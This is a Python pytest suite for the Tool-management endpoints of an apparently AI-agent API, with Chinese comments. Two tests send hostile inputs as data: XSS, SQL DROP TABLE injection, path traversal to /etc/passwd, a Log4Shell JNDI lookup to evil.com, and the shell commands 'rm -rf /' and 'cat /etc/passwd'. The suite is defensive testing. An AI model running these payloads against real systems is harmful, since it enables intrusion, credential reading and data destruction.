import pytest
import asyncio
from httpx import AsyncClient

class TestToolComplete:
    """Tool管理模块完整测试 - 基于后端测试用例.md"""

    # P0-TOOL-001: Tool配置注入测试
    @pytest.mark.asyncio
    async def test_tool_config_injection(self, auth_client: AsyncClient):
        """Tool配置注入测试"""
        malicious_configs = [
            {"api_key": "<script>alert('xss')</script>"},
            {"endpoint": "'; DROP TABLE tools; --"},
            {"config": {"url": "../../etc/passwd"}},
            {"name": "${jndi:ldap://evil.com/}"}
        ]
        
        for config in malicious_configs:
            response = await auth_client.post("/api/v1/Tool/", json={
                "name": "test_tool",
                "type": "api",
                **config
            })
            assert response.status_code == 200

    # P0-TOOL-002: 空值处理测试
    @pytest.mark.asyncio
    async def test_tool_creation_null_values(self, auth_client: AsyncClient):
        """空值处理测试"""
        test_cases = [
            {"name": None, "type": "api"},
            {"name": "", "type": "api"},
            {"name": "valid", "type": None},
            {"name": None, "type": None}
        ]
        
        for case in test_cases:
            response = await auth_client.post("/api/v1/Tool/", json=case)
            assert response.status_code == 200

    # P0-TOOL-003: 连接测试异常处理
    @pytest.mark.asyncio
    async def test_tool_connection_failure(self, auth_client: AsyncClient):
        """连接测试异常处理"""
        # 创建一个无效配置的tool
        response = await auth_client.post("/api/v1/Tool/", json={
            "name": "invalid_tool",
            "type": "api",
            "config": {"endpoint": "http://invalid-url-that-does-not-exist.com"}
        })
        
        if response.status_code == 200:
            tool_id = response.json()["data"]["id"]
            
            # 测试连接
            test_response = await auth_client.post(f"/api/v1/Tool/{tool_id}/test")
            assert test_response.status_code in [200, 404, 401, 500]
            
            if test_response.status_code == 200:
                data = test_response.json()["data"]
                assert "test_status" in data

    # Tool列表测试
    @pytest.mark.asyncio
    async def test_tool_list(self, auth_client: AsyncClient):
        """Tool列表测试"""
        response = await auth_client.get("/api/v1/Tool/")
        assert response.status_code == 200
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data
            assert isinstance(data["data"], list)

    # Tool获取测试
    @pytest.mark.asyncio
    async def test_tool_get_by_id(self, auth_client: AsyncClient):
        """根据ID获取Tool测试"""
        response = await auth_client.get("/api/v1/Tool/1")
        assert response.status_code == 404

    # Tool更新测试
    @pytest.mark.asyncio
    async def test_tool_update(self, auth_client: AsyncClient):
        """更新Tool测试"""
        response = await auth_client.put("/api/v1/Tool/1", json={
            "name": "updated_tool",
            "description": "updated description"
        })
        assert response.status_code == 404

    # Tool删除测试
    @pytest.mark.asyncio
    async def test_tool_delete(self, auth_client: AsyncClient):
        """删除Tool测试"""
        response = await auth_client.delete("/api/v1/Tool/999")
        assert response.status_code == 404

    # Tool类型测试
    @pytest.mark.asyncio
    async def test_tool_types(self, auth_client: AsyncClient):
        """Tool类型测试"""
        tool_types = ["api", "mcp", "builtin", "webhook"]
        
        for tool_type in tool_types:
            response = await auth_client.post("/api/v1/Tool/", json={
                "name": f"test_{tool_type}_tool",
                "type": tool_type,
                "config": {"test": "config"}
            })
            assert response.status_code == 200

    # 配置验证测试
    @pytest.mark.asyncio
    async def test_tool_config_validation(self, auth_client: AsyncClient):
        """Tool配置验证测试"""
        valid_configs = [
            {"endpoint": "https://api.example.com", "api_key": "test_key"},
            {"server_url": "http://localhost:8080", "timeout": 30},
            {"command": "echo hello", "args": ["arg1", "arg2"]}
        ]
        
        for config in valid_configs:
            response = await auth_client.post("/api/v1/Tool/", json={
                "name": "test_validation_tool",
                "type": "api",
                "config": config
            })
            assert response.status_code == 200

    # 列表分页测试
    @pytest.mark.asyncio
    async def test_tool_list_pagination(self, auth_client: AsyncClient):
        """Tool列表分页测试"""
        response = await auth_client.get("/api/v1/Tool/?skip=0&limit=10")
        assert response.status_code == 200
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data
            assert "total" in data
            assert isinstance(data["data"], list)

    # 过滤测试
    @pytest.mark.asyncio
    async def test_tool_filtering(self, auth_client: AsyncClient):
        """Tool过滤测试"""
        response = await auth_client.get("/api/v1/Tool/?type=api")
        assert response.status_code == 200

    # 搜索测试
    @pytest.mark.asyncio
    async def test_tool_search(self, auth_client: AsyncClient):
        """Tool搜索测试"""
        response = await auth_client.get("/api/v1/Tool/?search=test")
        assert response.status_code == 200

    # 并发创建测试
    @pytest.mark.asyncio
    async def test_tool_concurrent_creation(self, auth_client: AsyncClient):
        """并发创建测试"""
        results = []
        
        async def create_tool_async(name):
            response = await auth_client.post("/api/v1/Tool/", json={
                "name": name,
                "type": "api",
                "config": {"test": "config"}
            })
            return response.status_code
        
        # 创建10个并发请求
        tasks = [create_tool_async(f"concurrent_tool_{i}") for i in range(10)]
        results = await asyncio.gather(*tasks)
        
        # 验证没有系统崩溃
        assert all(status in [200, 400, 422, 401, 500] for status in results)

    # 大配置测试
    @pytest.mark.asyncio
    async def test_tool_large_config(self, auth_client: AsyncClient):
        """Tool大配置测试"""
        large_config = '{"data": "' + "x" * 10000 + '"}'  # 10KB配置
        
        response = await auth_client.post("/api/v1/Tool/", json={
            "name": "test_large_config_tool",
            "type": "api",
            "config": large_config
        })
        assert response.status_code == 200

    # 特殊字符测试
    @pytest.mark.asyncio
    async def test_tool_special_characters(self, auth_client: AsyncClient):
        """Tool特殊字符测试"""
        special_names = [
            "测试工具",
            "Tool 🚀",
            "Tool-Test_123",
            "Tool.Test"
        ]
        
        for name in special_names:
            response = await auth_client.post("/api/v1/Tool/", json={
                "name": name,
                "type": "api",
                "config": {"test": "config"}
            })
            assert response.status_code == 200

    # 性能测试
    @pytest.mark.asyncio
    async def test_tool_performance(self, auth_client: AsyncClient):
        """Tool性能测试"""
        import time
        
        start_time = time.time()
        response = await auth_client.get("/api/v1/Tool/")
        end_time = time.time()
        
        assert response.status_code == 200
        if response.status_code == 200:
            assert (end_time - start_time) < 2.0

    # 错误处理测试
    @pytest.mark.asyncio
    async def test_tool_error_handling(self, auth_client: AsyncClient):
        """Tool错误处理测试"""
        # 测试无效的JSON
        response = await auth_client.post("/api/v1/Tool/", 
                                         content="invalid json",
                                         headers={"Content-Type": "application/json"})
        assert response.status_code in [400, 422]
        
        # 测试缺少必需字段
        response = await auth_client.post("/api/v1/Tool/", json={})
        assert response.status_code == 200

    # 响应格式测试
    @pytest.mark.asyncio
    async def test_tool_response_format(self, auth_client: AsyncClient):
        """Tool响应格式测试"""
        response = await auth_client.get("/api/v1/Tool/")
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data
            assert isinstance(data["data"], list)

    # 状态管理测试
    @pytest.mark.asyncio
    async def test_tool_status_management(self, auth_client: AsyncClient):
        """Tool状态管理测试"""
        # 创建tool
        create_response = await auth_client.post("/api/v1/Tool/", json={
            "name": "status_test_tool",
            "type": "api",
            "config": {"endpoint": "https://api.example.com"}
        })
        
        if create_response.status_code == 200:
            tool_id = create_response.json()["data"]["id"]
            
            # 激活tool
            activate_response = await auth_client.post(f"/api/v1/Tool/{tool_id}/activate")
            assert activate_response.status_code in [200, 404, 401]
            
            # 停用tool
            deactivate_response = await auth_client.post(f"/api/v1/Tool/{tool_id}/deactivate")
            assert deactivate_response.status_code in [200, 404, 401]

    # 批量操作测试
    @pytest.mark.asyncio
    async def test_tool_batch_operations(self, auth_client: AsyncClient):
        """Tool批量操作测试"""
        # 创建多个tool
        tool_ids = []
        for i in range(3):
            response = await auth_client.post("/api/v1/Tool/", json={
                "name": f"batch_tool_{i}",
                "type": "api",
                "config": {"test": "config"}
            })
            if response.status_code == 200:
                tool_ids.append(response.json()["data"]["id"])
        
        # 批量激活
        if tool_ids:
            response = await auth_client.post("/api/v1/Tool/batch-activate", json={
                "tool_ids": tool_ids
            })
            assert response.status_code in [200, 404, 401, 422]

    # 模板管理测试
    @pytest.mark.asyncio
    async def test_tool_template_management(self, auth_client: AsyncClient):
        """Tool模板管理测试"""
        # 创建tool模板
        template_response = await auth_client.post("/api/v1/Tool/templates", json={
            "name": "test_template",
            "type": "api",
            "config_template": {"endpoint": "{endpoint}", "api_key": "{api_key}"}
        })
        assert template_response.status_code in [200, 404, 401, 422]
        
        if template_response.status_code == 200:
            template_id = template_response.json()["data"]["id"]
            
            # 从模板创建tool
            tool_response = await auth_client.post("/api/v1/Tool/from-template", json={
                "template_id": template_id,
                "name": "tool_from_template",
                "values": {"endpoint": "https://api.example.com", "api_key": "test_key"}
            })
            assert tool_response.status_code in [200, 404, 401, 422]

    # 版本管理测试
    @pytest.mark.asyncio
    async def test_tool_versioning(self, auth_client: AsyncClient):
        """Tool版本管理测试"""
        # 创建tool
        create_response = await auth_client.post("/api/v1/Tool/", json={
            "name": "version_test_tool",
            "type": "api",
            "config": {"version": "1.0"}
        })
        
        if create_response.status_code == 200:
            tool_id = create_response.json()["data"]["id"]
            
            # 创建新版本
            version_response = await auth_client.post(f"/api/v1/Tool/{tool_id}/versions", json={
                "config": {"version": "2.0"},
                "description": "updated version"
            })
            assert version_response.status_code in [200, 404, 401, 422]

    # 依赖管理测试
    @pytest.mark.asyncio
    async def test_tool_dependency_management(self, auth_client: AsyncClient):
        """Tool依赖管理测试"""
        # 创建有依赖的tool
        response = await auth_client.post("/api/v1/Tool/", json={
            "name": "dependency_test_tool",
            "type": "workflow",
            "dependencies": ["tool1", "tool2"],
            "config": {"test": "config"}
        })
        assert response.status_code == 200

    # 安全验证测试
    @pytest.mark.asyncio
    async def test_tool_security_validation(self, auth_client: AsyncClient):
        """Tool安全验证测试"""
        # 测试不安全的配置
        insecure_configs = [
            {"api_key": "plaintext_key"},
            {"endpoint": "http://insecure-site.com"},
            {"script": "rm -rf /"},
            {"command": "cat /etc/passwd"}
        ]
        
        for config in insecure_configs:
            response = await auth_client.post("/api/v1/Tool/", json={
                "name": "insecure_tool",
                "type": "api",
                "config": config
            })
            assert response.status_code == 200

    # 监控测试
    @pytest.mark.asyncio
    async def test_tool_monitoring(self, auth_client: AsyncClient):
        """Tool监控测试"""
        response = await auth_client.get("/api/v1/Tool/monitoring")
        assert response.status_code == 404
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data

    # 分析测试
    @pytest.mark.asyncio
    async def test_tool_analytics(self, auth_client: AsyncClient):
        """Tool分析测试"""
        response = await auth_client.get("/api/v1/Tool/analytics")
        assert response.status_code == 404
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data

    # 健康检查测试
    @pytest.mark.asyncio
    async def test_tool_health_check(self, auth_client: AsyncClient):
        """Tool健康检查测试"""
        # 创建tool
        create_response = await auth_client.post("/api/v1/Tool/", json={
            "name": "health_check_tool",
            "type": "api",
            "config": {"endpoint": "https://api.example.com"}
        })
        
        if create_response.status_code == 200:
            tool_id = create_response.json()["data"]["id"]
            
            # 健康检查
            health_response = await auth_client.get(f"/api/v1/Tool/{tool_id}/health")
            assert health_response.status_code in [200, 404, 401]

    # 使用统计测试
    @pytest.mark.asyncio
    async def test_tool_usage_stats(self, auth_client: AsyncClient):
        """Tool使用统计测试"""
        response = await auth_client.get("/api/v1/Tool/usage-stats")
        assert response.status_code == 404
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data

    # 分类测试
    @pytest.mark.asyncio
    async def test_tool_categories(self, auth_client: AsyncClient):
        """Tool分类测试"""
        response = await auth_client.get("/api/v1/Tool/categories")
        assert response.status_code == 404
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data

    # 标签测试
    @pytest.mark.asyncio
    async def test_tool_tags(self, auth_client: AsyncClient):
        """Tool标签测试"""
        # 创建带标签的tool
        create_response = await auth_client.post("/api/v1/Tool/", json={
            "name": "tagged_tool",
            "type": "api",
            "config": {"endpoint": "https://api.example.com"},
            "tags": ["api", "external", "test"]
        })
        
        if create_response.status_code == 200:
            tool_id = create_response.json()["data"]["id"]
            
            # 获取标签
            tags_response = await auth_client.get(f"/api/v1/Tool/{tool_id}/tags")
            assert tags_response.status_code in [200, 404, 401]

    # 备份恢复测试
    @pytest.mark.asyncio
    async def test_tool_backup_restore(self, auth_client: AsyncClient):
        """Tool备份恢复测试"""
        # 创建tool
        create_response = await auth_client.post("/api/v1/Tool/", json={
            "name": "backup_test_tool",
            "type": "api",
            "config": {"endpoint": "https://api.example.com"}
        })
        
        if create_response.status_code == 200:
            tool_id = create_response.json()["data"]["id"]
            
            # 备份tool
            backup_response = await auth_client.post(f"/api/v1/Tool/{tool_id}/backup")
            assert backup_response.status_code in [200, 404, 401]
            
            # 恢复tool
            if backup_response.status_code == 200:
                backup_id = backup_response.json()["data"].get("backup_id")
                if backup_id:
                    restore_response = await auth_client.post(f"/api/v1/Tool/restore/{backup_id}")
                    assert restore_response.status_code in [200, 404, 401]

    # 权限测试
    @pytest.mark.asyncio
    async def test_tool_permissions(self, auth_client: AsyncClient):
        """Tool权限测试"""
        response = await auth_client.get("/api/v1/Tool/permissions")
        assert response.status_code == 404

    # 审计测试
    @pytest.mark.asyncio
    async def test_tool_audit(self, auth_client: AsyncClient):
        """Tool审计测试"""
        response = await auth_client.get("/api/v1/Tool/audit")
        assert response.status_code == 404
        
        if response.status_code == 200:
            data = response.json()
            assert "data" in data
